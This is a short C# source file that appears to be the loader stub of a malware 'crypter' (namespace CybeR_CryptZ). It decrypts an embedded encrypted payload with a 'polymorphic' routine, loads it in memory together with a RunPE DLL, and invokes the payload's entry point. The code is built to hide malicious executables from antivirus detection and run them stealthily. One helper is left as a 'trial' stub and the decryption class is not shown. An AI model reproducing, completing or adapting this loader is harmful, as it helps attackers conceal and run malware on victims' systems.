using System.Diagnostics;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace CybeR_CryptZ
{

    public class This_Main
    {

        [DebuggerNonUserCode]
        public This_Main()
        {
        }

        public static void Main()
        {
            ResourceManager resourceManager2 = new ResourceManager("nameofrunpedll", Assembly.GetExecutingAssembly());
            ResourceManager resourceManager1 = new ResourceManager("EncryptionsResX", Assembly.GetExecutingAssembly());
            object[] objArr2 = new object[1];
            byte[] bArr = (byte[])resourceManager1.GetObject("EncryptionsResX");
            object[] objArr1 = new object[] { (byte[])resourceManager2.GetObject("nameofrunpedll") };
            objArr2[0] = RuntimeHelpers.GetObjectValue(This_Main.OwnZ(Assembly.Load(PolyStair.PolyDCryptStairs(ref bArr)), "PolyMorphicStairs", "PolyDeCryptStairs", objArr1));
            This_Main.OwnZ((Assembly)NewLateBinding.LateGet(null, typeof(Assembly), "Load", objArr2, null, null, null), "MainClass", "MainS", null);
        }

        public static object OwnZ(Assembly file, string Class, string Methodd, object[] Parameters)
        {
            // trial
            return null;
        }

    } // class This_Main

}

